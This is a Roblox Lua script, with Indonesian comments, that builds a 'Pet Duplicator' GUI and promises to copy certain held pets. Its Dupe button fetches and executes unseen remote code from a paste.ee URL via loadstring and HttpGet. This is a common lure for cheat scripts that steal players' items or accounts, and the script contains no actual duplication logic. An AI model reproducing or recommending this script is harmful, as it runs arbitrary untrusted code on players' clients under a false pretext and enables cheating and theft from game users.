local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- GUI Utama
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetDuplicatorGUI"
screenGui.Parent = gui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 180)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Judul
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "Pet Duplicator"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = mainFrame

-- Instruksi
local instructions = Instance.new("TextLabel")
instructions.Name = "Instructions"
instructions.Text = "Hold one of these pets:\n- Red Fox\n- Dragonfly\n- Raccoon\nThen click Dupe button"
instructions.Size = UDim2.new(0.9, 0, 0, 80)
instructions.Position = UDim2.new(0.05, 0, 0, 40)
instructions.BackgroundTransparency = 1
instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 13
instructions.TextXAlignment = Enum.TextXAlignment.Left
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Parent = mainFrame

-- Tombol Dupe
local dupeButton = Instance.new("TextButton")
dupeButton.Name = "DupeButton"
dupeButton.Text = "Dupe"
dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
dupeButton.Position = UDim2.new(0.05, 0, 0, 130)
dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
dupeButton.BorderSizePixel = 0
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.GothamBold
dupeButton.TextSize = 14
dupeButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = dupeButton

-- Notifikasi
local function showNotification(message, color)
    local notification = Instance.new("TextLabel")
    notification.Name = "Notification"
    notification.Text = message
    notification.Size = UDim2.new(0.8, 0, 0, 40)
    notification.Position = UDim2.new(0.5, 0, 0, -50)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = color
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = mainFrame

    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 6)
    notifCorner.Parent = notification

    delay(3, function()
        notification:Destroy()
    end)
end

-- Fungsi untuk mencari pet yang valid
local function findValidPet()
    local validPets = {
        ["Red Fox"] = true,
        ["Dragonfly"] = true,
        ["Raccoon"] = true
    }

    -- Cek di karakter pemain
    local character = player.Character
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") and validPets[item.Name] then
                return item
            end
        end
    end

    -- Cek di backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and validPets[item.Name] then
                return item
            end
        end
    end

    return nil
end

-- Fungsi untuk mengeksekusi script dupe
local function executeDupeScript()
    local pet = findValidPet()
    
    if not pet then
        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
        return
    end

    showNotification("Starting dupe process...", Color3.fromRGB(0, 150, 0))
    dupeButton.Text = "Duping..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)

    local success, err = pcall(function()
        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
    end)

    if success then
        showNotification("Dupe script executed!", Color3.fromRGB(0, 200, 0))
    else
        showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 50, 50))
        warn("Execution error: " .. tostring(err))
    end

    dupeButton.Text = "Dupe"
    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
end

-- Event klik tombol
dupeButton.MouseButton1Click:Connect(executeDupeScript)

-- Auto update ketika karakter berubah
player.CharacterAdded:Connect(function()
    wait(1) -- Beri waktu untuk load item
    if findValidPet() then
        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    else
        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end
end)

-- Update status awal
if findValidPet() then
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
end
